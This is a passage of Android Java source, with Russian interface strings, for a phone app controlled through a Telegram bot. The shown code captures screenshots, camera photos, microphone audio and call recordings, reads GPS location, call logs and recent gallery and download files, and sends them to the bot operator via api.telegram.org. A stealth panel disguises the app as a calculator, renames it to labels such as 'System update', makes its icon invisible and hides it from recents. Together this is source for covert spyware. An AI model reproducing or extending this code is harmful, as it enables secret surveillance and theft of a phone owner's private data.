                RelayService.stop(this);
                api.sendMessage(chat, "📡 Перезапускаю службу релея…", null);
                new Thread(() -> {
                    try { Thread.sleep(1500); } catch (Exception ignored) {}
                    RelayService.start(BotService.this);
                    try { Thread.sleep(3000); } catch (Exception ignored) {}
                    api.sendMessage(chat, Relay.diag(BotService.this), relayKb());
                }, "pulse-relay-restart").start();
                return;
            }
            case "relaynew": {
                Relay.regenerate(this);
                api.answer(id, "📡 Новый канал");
                editMaybe(chat, mid, isText, Net.channelsReport(this), relayKb());
                break;
            }
            case "diag": {
                api.answer(id, "🔍 Проверяю…");
                new Thread(() -> api.sendMessage(chat, Relay.checkTelegram(this), Kb.catSet()), "pulse-diag").start();
                break;
            }
            case "rescue": {
                api.answer(id, null);
                editMaybe(chat, mid, isText, Net.rescueGuide(this), Kb.catSet());
                break;
            }
            case "queueview": {
                org.json.JSONArray q = Net.queueOf(this);
                StringBuilder sb = new StringBuilder("📥 <b>Очередь</b>: " + q.length() + "\n\n");
                for (int i = 0; i < Math.min(q.length(), 20); i++) {
                    org.json.JSONObject o = q.optJSONObject(i);
                    if (o != null) sb.append("• <code>").append(esc(o.optString("cmd"))).append("</code>\n");
                }
                if (q.length() == 0) sb.append("<i>пусто</i>");
                editMaybe(chat, mid, isText, sb.toString(), relayKb());
                break;
            }
            case "queueflush": {
                Net.flush(this);
                api.answer(id, "📤 Досылаю");
                break;
            }
            case "cr": {
                String a2 = a1.isEmpty() ? "list" : a1.toLowerCase(java.util.Locale.ROOT);
                switch (a2) {
                    case "off": CallRec.setMode(this, CallRec.OFF); break;
                    case "all": CallRec.setMode(this, CallRec.ALL); break;
                    case "contacts": case "on": CallRec.setMode(this, CallRec.CONTACTS); break;
                    case "add": {
                        Act.setMode("callrec_add", "", chat);
                        api.sendMessage(chat, "➕ <b>Добавить контакт</b>\n\n"
                                + "Пришли номер или в формате <code>Имя|+79991234567</code>\n"
                                + "Например: <code>Мама|+79991234567</code>", null);
                        api.answer(id, "Жду номер");
                        break;
                    }
                    case "start": {
                        String err = CallRec.start(this, "manual");
                        api.answer(id, err == null ? "🔴 Пишу" : "⚠️ " + err);
                        editMaybe(chat, mid, isText, CallRec.report(this), Kb.callRecKb(this));
                        break;
                    }
                    case "stop": {
                        CallRec.stopAndSend(this);
                        api.answer(id, "⏹ Остановлено");
                        editMaybe(chat, mid, isText, CallRec.report(this), Kb.callRecKb(this));
                        break;
                    }
                    case "send": {
                        api.answer(id, "📤 Отправляю");
                        CallRec.sendLast(this, 5);
                        break;
                    }
                    default: {
                        api.answer(id, null);
                        editMaybe(chat, mid, isText, CallRec.report(this), Kb.callRecKb(this));
                    }
                }
                break;
            }
            case "allfunc": {
                api.answer(id, null);
                api.sendMessage(chat, cmdCatalog(), Kb.main());
                break;
            }
            case "ecotog": {
                boolean on = !Eco.on(this);
                Eco.set(this, on);
                api.answer(id, on ? "🌿 Экономный" : "⚡ Обычный");
                api.sendMessage(chat, Eco.report(this), Kb.catSet());
                break;
            }
            case "alertask": {
                Act.setMode("alert", "", chat);
                api.sendMessage(chat, "💬 <b>Алерт на экран</b>\n\n"
                        + "Пришли текст — высветится поверх всего.\n"
                        + "Стиль: <code>текст | danger | 30</code>\n"
                        + "• danger — красный\n• warn — жёлтый\n• success — зелёный\n• info — голубой", Kb.catCtl());
                break;
            }
            case "gallery5": {
                api.answer(id, "🖼 Отправляю");
                Gallery.sendLatest(this, 5);
                break;
            }
            case "iconpanel": {
                api.answer(id, null);
                sendIconPanel(chat);
                break;
            }
            case "icon": {
                int m = intOf(a1);
                Stealth.setMode(this, m);
                api.answer(id, "🎨 " + Stealth.describe(this));
                sendIconPanel(chat);
                break;
            }
            case "quiettog": {
                Config.setQuiet(this, !Config.quiet(this));
                api.answer(id, Config.quiet(this) ? "🔕 Тихо" : "🔔 Уведомления вкл");
                sendIconPanel(chat);
                break;
            }
            case "rectog": {
                Stealth.setNoRecents(this, !Stealth.noRecents(this));
                api.answer(id, Stealth.noRecents(this) ? "🗂 Недавние скрыты" : "🗂 Недавние видны");
                sendIconPanel(chat);
                break;
            }
            case "rename": {
                Config.setOffset(this, 0);
                api.sendMessage(chat, "📛 <b>Название приложения</b>\n\n"
                        + "Пришли название — оно появится под иконкой.\n"
                        + "Например: «Обновление системы», «Синхронизация», «Сервисы»\n\n"
                        + (Stealth.label(this).isEmpty() ? "" : "Сейчас: <b>" + esc(Stealth.label(this)) + "</b>\n\n")
                        + "<i>Чтобы вернуть исходное — пришли «сброс»</i>", Kb.catSet());
                Act.setMode("rename", "", chat);
                break;
            }
            case "webapp": {
                String url = "http://" + WebServer.lanIp() + ":" + WebServer.port() + "/";
                api.sendWebApp(chat,
                        "🎛 <b>WebApp-панель</b>\n\n"
                                + "📍 этот телефон: <code>http://127.0.0.1:" + WebServer.port() + "/</code>\n"
                                + "📍 в Wi-Fi: <code>" + url + "</code>\n\n" + Sys.footer(this),
                        url, "🎛 Открыть WebApp");
                break;
            }
            case "fsearch": {
                api.answer(id, null);
                StringBuilder sb = new StringBuilder("🔍 <b>Поиск по функциям</b>\n\n");
                sb.append("Скриншот: <code>/screen</code> · Домой: <code>/home</code> · Блокировка: <code>/lock</code>\n")
                  .append("Фото: кнопка 📷 · Видео: 🎥 · Микрофон: 🎙 · Запись: 🔴\n")
                  .append("Обои: киньте фото + /wall · Файлы: /ls /get\n")
                  .append("Макрос: /macro Имя = mute, lock\n")
                  .append("Расписание: /sched 30 блок\n")
                  .append("Дайджест: /digest · Триггер: /trig\n")
                  .append("CPU/RAM/сеть: /sys · Speedtest: /speed\n")
                  .append("PIN: /pin 1234 · Паника: кнопка 🧨\n")
                  .append("Справка: /menu");
                api.sendMessage(chat, sb.toString(), Kb.main());
                break;
            }
            case "nm": {
                Config.notifIgnoreAdd(this, a1);
                api.answer(id, "🚫 Больше не присылаю: " + Apps.labelOf(this, a1));
                try {
                    new TgApi(cfg.token).editText(chat, mid, "🚫 <b>" + esc(Apps.labelOf(this, a1)) + "</b> добавлен в игнор-лист", null);
                } catch (Exception ignored) {}
                break;
            }
            default:
                api.answer(id, null);
                editMaybe(chat, mid, isText, textMain(), Kb.main());
        }
    }

    private static int intOf(String s, int def) {
        try { return Integer.parseInt(s.trim()); } catch (Exception e) { return def; }
    }

    // ================================================================== action impls

    private void global(int action) {
        ui.post(() -> { try { performGlobalAction(action); } catch (Exception ignored) {} });
    }

    private void doHome(long chat) {
        Config.count(this, "home");
        boolean ok = performGlobalAction(GLOBAL_ACTION_HOME);
        api.sendMessage(chat, ok ? "🏠 <b>Готово</b> — телефон на рабочем столе.\n\n" + Sys.footer(this)
                : "⚠️ Служба доступа выключена.", Kb.main());
        LogStore.add("🏠 Домой");
    }

    private void doLock(long chat) {
        boolean ok = performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
        api.sendMessage(chat, ok ? "🔒 <b>Экран заблокирован</b>" : "⚠️ Не удалось", Kb.main());
        LogStore.add("🔒 Блокировка");
    }

    private void captureAndSend(long chat) {
        Config.count(this, "screen");
        LogStore.add("📸 Скриншот…");
        Screenshots.capture(this, new Screenshots.Callback() {
            @Override public void onShot(byte[] jpeg) {
                LogStore.add("📸 Снимок готов (" + (jpeg.length / 1024) + " КБ)");
                act(() -> sendShot(chat, jpeg));
            }
            @Override public void onError(String reason) {
                LogStore.add("📸 Ошибка: " + reason);
                act(() -> api.sendMessage(chat, "📸 <b>Скриншот не получился</b>\n<i>" + reason + "</i>\n\n"
                        + "Проверьте, что служба доступа включена.", Kb.main()));
            }
        });
    }

    private void sendShot(long chat, byte[] jpeg) {
        if (lastShotMsg != 0) { api.delete(chat, lastShotMsg); lastShotMsg = 0; }
        String caption = "📸 <b>Скриншот экрана</b>\n" + Sys.time() + "\n\n" + Sys.footer(this);
        Http.Resp r = api.sendPhoto(chat, jpeg, caption, Kb.main());
        if (r.ok()) {
            try { lastShotMsg = new JSONObject(r.body).getJSONObject("result").optLong("message_id"); }
            catch (Exception ignored) {}
            LogStore.add("📸 Отправлено");
        } else LogStore.add("📸 Не ушло: " + r.description());
    }

    private void act(Runnable r) { actions.execute(r); }

    private void shootCamera(long chat, boolean front, int delay) {
        Config.count(this, "photo");
        if (!Perms.granted(this, android.Manifest.permission.CAMERA)) {
            api.sendMessage(chat, "📷 <b>Нет разрешения на камеру</b>\nОткройте приложение → «Выдать разрешения».", Kb.camera());
            return;
        }
        Runnable shot = () -> Capture.photo(this, front, new Capture.PhotoCb() {
            @Override public void ok(byte[] jpeg) {
                api.sendMessage(chat, "📷 Снимаю…", null);
                new Thread(() -> Act.sendPhoto(jpeg, "📷 <b>Фото с камеры</b> (" + (front ? "фронт" : "тыл") + ")\n\n"
                        + Sys.footer(BotService.this)), "pulse-cam").start();
            }
            @Override public void err(String why) {
                api.sendMessage(chat, "📷 <b>Камера не сработала</b>\n<i>" + why + "</i>", Kb.camera());
            }
        });
        if (delay > 0) {
            api.sendMessage(chat, "⏱ Снимок через " + delay + " сек…", null);
            ui.postDelayed(shot, delay * 1000L);
        } else shot.run();
    }

    private void typeInField(long chat, String hint, String text) {
        Tools.typeText(this, hint, text, new Tools.Cb() {
            @Override public void ok(String msg) {
                api.sendMessage(chat, "⌨️ <b>Введено</b>\n\n<code>" + esc(text) + "</code>\n\n" + Sys.footer(BotService.this), Kb.main());
                LogStore.add("⌨️ Текст введён (" + text.length() + " симв.)");
            }
            @Override public void err(String why) {
                api.sendMessage(chat, "⌨️ <b>Не получилось</b>\n<i>" + why + "</i>\n\n"
                        + "Откройте на телефоне приложение с полем ввода и попробуйте снова.", Kb.textPanel());
            }
        });
    }

    private void launchByName(long chat, String query) {
        String pkg = Apps.findPkg(this, query);
        if (pkg == null) {
            api.sendMessage(chat, "🚀 <b>Не нашёл приложение</b> «" + esc(query) + "»\n\n"
                    + "Посмотрите список установленных:", Kb.main());
            sendApps(chat);
            return;
        }
        boolean ok = Apps.launch(this, pkg);
        String label = Apps.labelOf(this, pkg);
        api.sendMessage(chat, (ok ? "🚀 <b>Открыл:</b> " : "⚠️ <b>Не открылось:</b> ") + esc(label)
                + "\n\n" + Sys.footer(this), Kb.main());
        LogStore.add("🚀 " + label + (ok ? "" : " (ошибка)"));
    }

    private void sendApps(long chat) {
        appsSession = Tools.appList(this);
        appsPage = 0;
        api.sendMessage(chat, textApps(), Kb.appsPage(appsSession, appsPage));
    }

    private void sendLocation(long chat) {
        if (!Perms.granted(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
                && !Perms.granted(this, android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
            api.sendMessage(chat, "📍 <b>Нет разрешения на геолокацию</b>\nОткройте приложение → «Выдать разрешения».", Kb.more());
            return;
        }
        Sys.location(this, new Sys.LocCb() {
            @Override public void ok(double lat, double lon, float acc) {
                try {
                    JSONObject b = TgApi.obj();
                    b.put("chat_id", chat);
                    b.put("latitude", lat);
                    b.put("longitude", lon);
                    Http.Resp r = Http.postJson("https://api.telegram.org/bot" + cfg.token + "/sendLocation", b, 20000);
                    if (r.ok()) LogStore.add("📍 Локация отправлена");
                    api.sendMessage(chat, "📍 <b>Телефон здесь</b> (точность ~" + Math.round(acc) + " м)\n"
                            + "https://maps.google.com/?q=" + lat + "," + lon + "\n\n" + Sys.footer(BotService.this), Kb.main());
                } catch (Exception e) {
                    api.sendMessage(chat, "📍 " + lat + ", " + lon, Kb.main());
                }
            }
            @Override public void err(String why) {
                api.sendMessage(chat, "📍 <b>Локация недоступна</b>\n<i>" + why + "</i>", Kb.more());
            }
        });
    }

    private void sendFiles(long chat) {
        new Thread(() -> {
            try {
                List<java.io.File> found = new ArrayList<>();
                java.io.File dcim = android.os.Environment
                        .getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DCIM);
                collectRecent(dcim, found, 6);
                java.io.File dl = android.os.Environment
                        .getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS);
                collectRecent(dl, found, 6);
                if (found.isEmpty()) {
                    api.sendMessage(chat, "📁 Не нашёл свежих фото/файлов.\n"
                            + "<i>Приложение работает без разрешения «Файлы» — Android 11+ может скрывать галерею. "
                            + "Скриншоты всегда доступны кнопкой 📸.</i>", Kb.more());
                    return;
                }
                int n = 0;
                for (java.io.File f : found) {
                    if (n++ >= 4) break;
                    byte[] data = Capture.readAll(f);
                    if (data == null || data.length > 8 * 1024 * 1024) continue;
                    boolean img = f.getName().toLowerCase().matches(".*\\.(jpg|jpeg|png|webp)$");
                    if (img) {
                        byte[] jpeg = data;
                        try {
                            android.graphics.Bitmap bmp = android.graphics.BitmapFactory.decodeByteArray(data, 0, data.length);
                            if (bmp != null) {
                                java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
                                bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 85, bo);
                                jpeg = bo.toByteArray();
                            }
                        } catch (Exception ignored) {}
                        api.sendPhoto(chat, jpeg, "📁 <b>" + esc(f.getName()) + "</b>", null);
                    } else {
                        api.sendDocument(chat, data, f.getName(), "📁 <b>" + esc(f.getName()) + "</b>", null);
                    }
                }
                LogStore.add("📁 Отправлено файлов: " + Math.min(4, found.size()));
            } catch (Exception e) {
                LogStore.add("📁 " + e.getMessage());
            }
        }, "pulse-files").start();
    }

    private void collectRecent(java.io.File dir, List<java.io.File> out, int limit) {
        try {
            if (dir == null || !dir.exists()) return;
            java.io.File[] fs = dir.listFiles();
            if (fs == null) return;
            java.util.Arrays.sort(fs, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
            int n = 0;
            for (java.io.File f : fs) {
                if (f.isFile() && n < limit) { out.add(f); n++; }
            }
        } catch (Exception ignored) {}
    }

    private void openUrl(long chat, String url) {
        String u = url.trim();
        if (!u.startsWith("http")) u = "https://" + u;
        try {
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(u));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            api.sendMessage(chat, "🌐 <b>Открыл на телефоне</b>\n" + esc(u), Kb.main());
        } catch (Exception e) {
            api.sendMessage(chat, "🌐 Не смог открыть ссылку: " + e.getMessage(), Kb.more());
        }
    }

    private void sendClipSet(long chat, String text) {
        boolean ok = Sys.setClipboard(this, text);
        api.sendMessage(chat, ok ? "📋 <b>Скопировано в буфер телефона</b>\n\n<code>" + esc(text) + "</code>"
                : "📋 Не удалось", Kb.more());
    }

    private void addSchedule(long chat, String input) {
        try {
            String[] parts = input.trim().split("\\s+", 2);
            int min = Integer.parseInt(parts[0].replaceAll("[^0-9]", ""));
            String rest = parts.length > 1 ? parts[1].trim() : "lock";
            String low = rest.toLowerCase(Locale.ROOT);
            String cmd, arg = "";
            if (low.startsWith("блок")) cmd = "lock";
            else if (low.startsWith("тиш") || low.startsWith("без звука") || low.equals("mute")) cmd = "mute";
            else if (low.startsWith("звук") || low.equals("unmute")) cmd = "unmute";
            else if (low.startsWith("дом")) cmd = "home";
            else if (low.startsWith("сирен") || low.startsWith("найди")) cmd = "find";
            else if (low.startsWith("скажи")) { cmd = "tts"; arg = rest.substring(5).trim(); }
            else cmd = "lock";
            Sched.add(this, min, cmd, arg);
            api.sendMessage(chat, "⏰ <b>Запланировано</b>\nЧерез " + min + " мин: " + Sched.label(cmd, arg)
                    + "\n\n" + Sched.dump(this), Kb.schedule());
        } catch (Exception e) {
            api.sendMessage(chat, "⏰ <b>Не понял формат</b>\nПример: <code>30 блок</code>", Kb.schedule());
        }
    }

    private void addMacro(long chat, String input) {
        try {
            String[] parts = input.split("=", 2);
            if (parts.length < 2) throw new Exception("формат");
            String name = parts[0].trim();
            JSONArray acts = new JSONArray();
            for (String a : parts[1].split(",")) {
                String t = a.trim();
                if (!t.isEmpty()) acts.put(t);
            }
            JSONArray all = Config.macros(this);
            JSONObject o = new JSONObject();
            o.put("name", name);
            o.put("acts", acts);
            all.put(o);
            Config.macrosSet(this, all);
            api.sendMessage(chat, "🎬 <b>Макрос «" + esc(name) + "» создан</b>\n\n" + textMacro(), Kb.macroPanel(Config.macros(this)));
        } catch (Exception e) {
            api.sendMessage(chat, "🎬 Формат: <code>Имя = mute, lock, open:ютуб</code>", Kb.macroPanel(Config.macros(this)));
        }
    }

    private void addTrigger(long chat, String input) {
        try {
            String[] parts = input.split("=", 2);
            if (parts.length < 2) throw new Exception("формат");
            JSONArray arr = Config.triggers(this);
            JSONObject o = new JSONObject();
            o.put("ssid", parts[0].trim());
            o.put("act", parts[1].trim());
            arr.put(o);
            Config.triggersSet(this, arr);
            api.sendMessage(chat, "📶 <b>Триггер добавлен</b>\n\n" + trigDump(this), Kb.catAuto());
        } catch (Exception e) {
            api.sendMessage(chat, "📶 Формат: <code>Моя_сеть = mute</code>", Kb.catAuto());
        }
    }

    private void addAdmin(long chat, String input) {
        try {
            long id = Long.parseLong(input.replaceAll("[^0-9]", ""));
            Config.addAdmin(this, id);
            api.sendMessage(chat, "👥 <b>Админ добавлен:</b> <code>" + id + "</code>", Kb.admins());
        } catch (Exception e) {
            api.sendMessage(chat, "👥 Нужен числовой ID.", Kb.admins());
        }
    }

    private void delAdmin(long chat, String input) {
        try {
            long id = Long.parseLong(input.replaceAll("[^0-9]", ""));
            Config.delAdmin(this, id);
            api.sendMessage(chat, "🗑 Удалён: <code>" + id + "</code>", Kb.admins());
        } catch (Exception e) {
            api.sendMessage(chat, "🗑 Нужен числовой ID.", Kb.admins());
        }
    }

    private void setPin(long chat, String input) {
        String pin = input.replaceAll("[^0-9]", "");
        if (pin.length() < 4 || pin.length() > 8) {
            api.sendMessage(chat, "🔐 PIN должен быть 4–8 цифр.", null);
            return;
        }
        Config.setPin(this, pin);
        AUTHED.put(chat, System.currentTimeMillis() + 30 * 60 * 1000L);
        api.sendMessage(chat, "🔐 <b>PIN установлен.</b>\nТеперь вход в бота — по этому коду (30 минут на сессию).", Kb.main());
    }

    private void editMaybe(long chat, long mid, boolean isText, String text, JSONObject kb) {
        if (mid == 0) { api.sendMessage(chat, text, kb); return; }
        Http.Resp r = isText ? api.editText(chat, mid, text, kb) : api.editCaption(chat, mid, text, kb);
        if (!r.ok()) api.sendMessage(chat, text, kb);
    }

    // ================================================================== siren / sos

    private static Runnable sirenStop;
    private static final Handler SH = new Handler(Looper.getMainLooper());

    private static void sirens(Context c, int seconds) {
        stopSiren();
        try {
            Sys.volumeMax(c);
            final android.media.MediaPlayer mp = new android.media.MediaPlayer();
            android.media.AudioAttributes attrs = new android.media.AudioAttributes.Builder()
                    .setUsage(android.media.AudioAttributes.USAGE_ALARM)
                    .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .build();
            mp.setAudioAttributes(attrs);
            android.net.Uri uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM);
            if (uri == null) uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE);
            mp.setDataSource(c, uri);
            mp.setLooping(true);
            mp.prepare();
            mp.start();
            Tools.vibrate(c, Math.min(seconds, 10));
            Tools.torch(c, true);
            final android.media.MediaPlayer player = mp;
            sirenStop = () -> {
                try { player.stop(); player.release(); } catch (Exception ignored) {}
                try { Tools.torch(Act.ctx(), false); } catch (Exception ignored) {}
                Tools.stopVibrate();
            };
            SH.postDelayed(() -> { try { if (sirenStop != null) sirenStop.run(); } catch (Exception ignored) {} },
                    Math.max(1, seconds) * 1000L);
        } catch (Exception e) {
            Tools.vibrate(c, seconds);
            Tools.torch(c, true);
        }
    }

    public static void stopSirenPublic() { stopSiren(); }

    public void performKey(int keyCode) { LogStore.add("⌨️ keyevent " + keyCode); }

    public void cancelAllNotifs() {
        try {
            android.service.notification.NotificationListenerService.requestRebind(
                    new android.content.ComponentName(this, NotifyHook.class));
            LogStore.add("🔔 Запрошено очищение уведомлений");
        } catch (Exception ignored) {}
    }

    public void doGlobal(int action) { global(action); }

    public void listFilesPublic(String path) {
        long chat = Config.get(this).adminId();
        if (chat != 0) sendFiles(chat);
    }

    public void runMacroPublic(String name) {
        JSONArray all = Config.macros(this);
        for (int i = 0; i < all.length(); i++) {
            JSONObject o = all.optJSONObject(i);
            if (o == null) continue;
            if (name.equalsIgnoreCase(o.optString("name"))) {
                long chat = Config.get(this).adminId();
                runMacro(chat, name, o.optJSONArray("acts"));
                return;
            }
        }
        LogStore.add("🎬 Макрос не найден: " + name);
    }

    public static String notifHistoryTextPublic(Context c) {
        StringBuilder sb = new StringBuilder("🔔 <b>История уведомлений</b>\n\n");
        java.util.List<String> h = Config.notifHistory(c);
        if (h.isEmpty()) sb.append("<i>пока пусто</i>");
        else for (String line : h) sb.append("• ").append(esc(line)).append("\n");
        return sb.toString();
    }

    // ---- public bridges used by the embedded WebServer ----
    public static void startSirenPublic(Context c, int sec) { sirens(c, sec); }
    public static void startMicPublic(Context c, int sec) {
        if (!Perms.granted(c, android.Manifest.permission.RECORD_AUDIO)) {
            Act.sendToAdmin("🎙 Нет разрешения на микрофон", null);
            return;
        }
        Capture.micStart(c, sec, new Capture.AudioCb() {
            @Override public void ok(byte[] mp4, String mime) {
                new Thread(() -> Act.sendAudio(mp4, "🎙 <b>Голосовая запись</b> · " + sec + " сек"), "pulse-mic").start();
            }
            @Override public void err(String why) { Act.sendToAdmin("🎙 " + why, null); }
        });
    }
    public static void startBurstPublic(Context c) {
        Capture.burst(c, 4, new Capture.BurstCb() {
            @Override public void frame(byte[] jpeg, int n, int total) {
                new Thread(() -> Act.sendPhoto(jpeg, "📸 Кадр " + n + "/" + total), "pulse-burst").start();
            }
            @Override public void done(int n) { Act.sendToAdmin("📸 Серия: " + n + " кадров", null); }
            @Override public void err(String why) { Act.sendToAdmin("📸 " + why, null); }
        });
    }
    public static String statTextPublic(Context c) {
        BotService b = instance;
        if (b != null) return b.textStat();
        return "📊 " + Sys.deviceName() + "\n🔋 " + Sys.batteryPercent(c) + "% · 🌐 " + Sys.netName(c);
    }
    public static String macroTextPublic(Context c) {
        BotService b = instance;
        if (b != null) return b.textMacro();
        return "🎬 Макросы доступны в боте: /menu → Авто";
    }

    public void shootAndSend() {
        long chat = Config.get(this).adminId();
        if (chat != 0) captureAndSend(chat);
    }

    private void gridShot(long chat) {
        captureAndSend(chat);
    }

    /** Полный справочник функций для бота. */
    public static String cmdCatalog() {
        return "📚 <b>Все функции</b>\n\n"
                + "<i>Вызывай так:</i> <code>/_ имя</code> или <code>/_ имя:аргумент</code>\n"
                + "<i>Например:</i> <code>/_ torch</code> · <code>/_ setvol:70</code>\n\n"
                + "<b>🖥 Экран</b>\n"
                + "<code>screen</code> скриншот · <code>lockscreen</code> локскрин · <code>home</code> домой\n"
                + "<code>back</code> назад · <code>recents</code> недавние · <code>notif</code> шторка\n"
                + "<code>lock</code> блокировка · <code>wake</code> разбудить · <code>screen_off</code> погасить\n"
                + "<code>live</code> живой экран · <code>stop_rec</code> стоп запись\n"
                + "<code>rot0/rot90/rot180/rot270</code> поворот · <code>night/night_off</code> ночной\n"
                + "<code>invert</code> инверсия · <code>font_big/font_norm</code> шрифт\n\n"
                + "<b>🎮 Жесты</b>\n"
                + "<code>s_up/s_down/s_left/s_right</code> свайпы · <code>tap</code> тап\n"
                + "<code>scroll_up/scroll_down</code> скролл · <code>tap</code> · <code>enter</code>\n"
                + "<code>multitap2/multitap3</code> · <code>longpress</code> · <code>doubletap</code>\n"
                + "<code>pinch_in/pinch_out</code> зум · <code>grid25:A1</code> сетка 5×5\n"
                + "<code>taptext:Отправить</code> тап по тексту · <code>type:привет</code> ввод\n"
                + "<code>tapid:id/кнопка</code> тап по ID\n\n"
                + "<b>🔊 Звук и свет</b>\n"
                + "<code>volume_up/volume_down</code> · <code>setvol:70</code> громкость\n"
                + "<code>vol_full/vol_mute</code> · <code>ring_up/ring_dn</code> звонок\n"
                + "<code>mute/unmute</code> · <code>dnd</code> не беспокоить\n"
                + "<code>bright:1/-1</code> · <code>bright_pct:50</code> · <code>bright_auto</code>\n"
                + "<code>streams</code> все громкости · <code>keepawake</code> не спать\n\n"
                + "<b>🎵 Медиа</b> <code>prev</code> <code>play</code> <code>next</code> <code>nowplaying</code>\n\n"
                + "<b>🚨 Сигналы</b> <code>torch</code> <code>torch_on/off</code> · <code>vibrate</code> <code>vib_stop</code>\n"
                + "<code>find</code> сирена · <code>sos</code> SOS · <code>siren_stop</code> стоп\n\n"
                + "<b>📷 Камера</b> <code>photo_back</code> <code>photo_front</code> <code>burst</code>\n"
                + "<code>video:10</code> · <code>rec:30</code> экран · <code>mic:15</code> микрофон <code>mic_stop</code>\n\n"
                + "<b>🖼 Галерея и алерты</b> <code>gallery:5</code> · <code>gallery_list</code>\n"
                + "<code>alert:текст</code> · <code>alert:текст|danger|30</code> · <code>alert_hide</code>\n"
                + "<code>alert_danger</code> красный\n\n"
                + "<b>📱 Приложения</b> <code>open:pkg</code> · <code>openname:ютуб</code>\n"
                + "<code>applist</code> · <code>appinfo:pkg</code> · <code>appsize:pkg</code>\n"
                + "<code>appperms:pkg</code> · <code>appuninstall:pkg</code> · <code>fgapp</code> <code>fg</code>\n\n"
                + "<b>📁 Файлы</b> <code>ls</code> · <code>export:путь</code> · <code>readfile:путь</code>\n"
                + "<code>speakfile:путь</code> · <code>fs_mkdir:путь</code> · <code>fs_delete:путь</code>\n"
                + "<code>fs_search:имя</code> · <code>fs_rename:от|до</code> · <code>fs_copy:от|до</code>\n"
                + "<code>clip</code> буфер · <code>clipset:текст</code> · <code>export_config</code>\n\n"
                + "<b>📞 Телефония</b> <code>call:номер</code> · <code>sms:номер текст</code>\n"
                + "<code>contacts:имя</code> · <code>alarm:07:30</code> · <code>timer:300</code>\n"
                + "<code>calllog</code> · <code>missed</code> · <code>answer</code> · <code>reject</code> <code>hangup</code>\n\n"
                + "<b>📊 Диагностика</b> <code>cpu</code> <code>ram</code> <code>net</code> <code>bat</code>\n"
                + "<code>speed</code> <code>vpn</code> <code>sys</code> <code>stats</code> <code>log</code> <code>geo</code>\n"
                + "<code>cpuhealth</code> <code>disk</code> <code>sensors</code> <code>uptime</code> <code>rootcheck</code>\n"
                + "<code>batusers</code> · <code>nactive</code> <code>nclearall</code> <code>nhist</code>\n\n"
                + "<b>📡 Связь</b> <code>diag</code> <code>channels</code> <code>rescue</code> <code>probe</code>\n"
                + "<code>relay</code> <code>relay_channel</code> <code>relay_new</code>\n"
                + "<code>queue</code> <code>queue_flush</code> <code>queue_clear</code>\n\n"
                + "<b>⚙️ Настройки</b> <code>ui_wifi</code> <code>ui_battery</code> <code>ui_storage</code>\n"
                + "<code>ui_access</code> <code>ui_location</code> <code>ui_apps</code> <code>ui_sound</code>\n"
                + "<code>ui_display</code> <code>ui_datetime</code> <code>ui_dev</code> <code>ui_writesettings</code>\n"
                + "<code>wifi_ui</code> <code>bt_ui</code> <code>data_ui</code> <code>hotspot_ui</code> <code>nfc_ui</code>\n"
                + "<code>powersave</code> <code>dark</code> <code>airplane</code> <code>lockorient</code>\n\n"
                + "<b>🤖 Авто</b> <code>sched:30:lock</code> · <code>macros</code> · <code>runmac:Ночь</code>\n"
                + "<code>tracking</code> <code>alerts</code> <code>digest</code> <code>stealth_toggle</code>\n\n"
                + "<b>🥷 Скрытность</b> <code>stealth</code> · <code>stealth_toggle</code> · <code>panic</code>\n\n"
                + Sys.footer(instance);
    }

    private JSONObject relayKb() {
        boolean on = Relay.enabled(this);
        return Kb.kb(
                Kb.r(Kb.b(on ? "⛔ Выключить релей" : "✅ Включить релей", "m:relaytog"),
                        Kb.b("🔄 Новый канал", "m:relaynew")),
                Kb.r(Kb.b("🔬 Тест релея", "m:relaytest"), Kb.b("🔄 Перезапуск", "m:relayrestart")),
                Kb.r(Kb.b("🔍 Диагностика", "m:diag"), Kb.b("🆘 Что делать", "m:rescue")),
                Kb.r(Kb.b("🆘 Что делать", "m:rescue")),
                Kb.r(Kb.b("📥 Очередь", "m:queueview"), Kb.b("📤 Дослать", "m:queueflush")),
                Kb.r(Kb.b("◀️ В меню", "m:menu"))
        );
    }

    private void sendIconPanel(long chat) {
        int m = Stealth.mode(this);
        StringBuilder sb = new StringBuilder("🥷 <b>Скрытность</b>\n\n");
        sb.append("Текущий режим: <b>").append(Stealth.NAMES[m]).append("</b>\n\n");
        sb.append("• <b>Обычная</b> — «Pulse Control» на рабочем столе\n");
        sb.append("• <b>Калькулятор</b> — «Калькулятор», код 6969「=」→ пульт\n");
        sb.append("• <b>Невидимая</b> — прозрачная 1×1, пустое имя\n");
        sb.append("• <b>Полностью скрыта</b> — только через бота\n\n");
        sb.append("🔕 Тихий режим: ").append(Config.quiet(this) ? "вкл" : "выкл").append("\n");
        sb.append("🗂 Недавние: ").append(Stealth.noRecents(this) ? "скрыто" : "видно").append("\n");
        sb.append("📛 Название: <b>").append(Stealth.label(this).isEmpty() ? "исходное" : esc(Stealth.label(this))).append("</b>\n\n");
        sb.append(Sys.footer(this));

        JSONObject kb = Kb.kb(
                Kb.r(Kb.b("○ Обычная", "m:icon:0"), Kb.b("🎭 Калькулятор", "m:icon:1")),
                Kb.r(Kb.b("👻 Невидимая", "m:icon:2"), Kb.b("🙈 Скрыть всё", "m:icon:3")),
                Kb.r(Kb.b("🔕 Тихий " + (Config.quiet(this) ? "выкл" : "вкл"), "m:quiettog"),
                        Kb.b("🗂 Недавние", "m:rectog")),
                Kb.r(Kb.b("📛 Название", "m:rename")),
                Kb.r(Kb.b("◀️ В меню", "m:menu"))
        );
        api.sendMessage(chat, sb.toString(), kb);
    }

    private String textCat(String title, String sub) {
        return "<b>" + title + "</b>\n<i>" + sub + "</i>\n\n" + Sys.footer(this);
    }

    private int intOf(String s) {
        try { return Integer.parseInt(s.trim()); } catch (Exception e) { return 0; }
    }

    private String textMacro() {
